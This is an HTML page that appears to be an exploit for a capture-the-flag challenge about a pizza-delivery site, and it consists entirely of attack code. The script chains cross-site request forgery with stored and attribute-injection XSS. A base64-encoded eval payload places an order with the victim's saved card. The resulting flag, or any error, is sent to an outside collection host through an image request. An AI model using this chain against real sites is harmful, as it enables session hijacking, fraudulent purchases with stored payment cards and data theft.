<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body>
<script>
const DELIVERY = "http://delivery.alfactf.local";
const COLLECT = "http://sigma.ar-iss.net/upd/ex.html";

const stage2 = `
(async()=>{
  const j = r => r.json();

  const cards = await fetch("/api/cards").then(j);
  const menu = await fetch("/api/menu").then(j);
  const addrs = await fetch("/api/addresses").then(j);

  const card = cards.cards[0];
  const pizza = menu.items.find(p => p.name.toLowerCase() === "flag pizza");
  const addr = addrs.addresses[0];

  const made = await fetch("/api/orders", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      address_id: addr.id,
      items: [{pizza_id: pizza.id, quantity: 1}],
      payment_method: "card",
      saved_card_id: card.id
    })
  }).then(j);

  const detail = await fetch("/api/orders/" + made.order.id).then(j);

  new Image().src = "${COLLECT}?flag=" +
    encodeURIComponent(detail.order.flag || JSON.stringify(detail));
})().catch(e => {
  new Image().src = "${COLLECT}?err=" +
    encodeURIComponent(e.stack || e.message || e);
});
`.trim();

const b64 = btoa(stage2);

const storedLabel =
  `</strong><img src=x onerror="eval(atob(\`${b64}\`))">`;

const stage1 =
  `x' autofocus onfocus='` +
  `(async()=>{` +
    `let l=${JSON.stringify(storedLabel)};` +
    `await fetch("${DELIVERY}/api/addresses",{` +
      `method:"POST",` +
      `mode:"no-cors",` +
      `credentials:"include",` +
      `headers:{"Content-Type":"text/plain"},` +
      `body:JSON.stringify({label:l,city:"x",street:"x",house:"1"})` +
    `});` +
    `setTimeout(()=>location="${DELIVERY}/addresses",700)` +
  `})()` +
  `' a='`;

fetch("http://landing.alfactf.local/api/landing/callback", {
    method: "POST",
    mode: "no-cors",
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: new URLSearchParams({phone: stage1})
});
</script></body></html>
